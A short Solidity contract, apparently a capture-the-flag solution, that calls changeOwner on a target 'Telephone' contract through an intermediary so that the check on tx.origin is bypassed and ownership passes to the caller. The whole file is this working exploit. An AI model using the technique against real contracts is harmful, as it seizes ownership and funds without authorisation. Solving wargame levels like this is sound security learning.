// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface Telephone {
      function changeOwner(address _guess) external;
}

contract TelephoneOwner {
  Telephone telephone;
  constructor(address _telephone ) {
    telephone = Telephone(_telephone);
  }

  function changeOwnerHack() public {
    telephone.changeOwner(msg.sender);
  }
}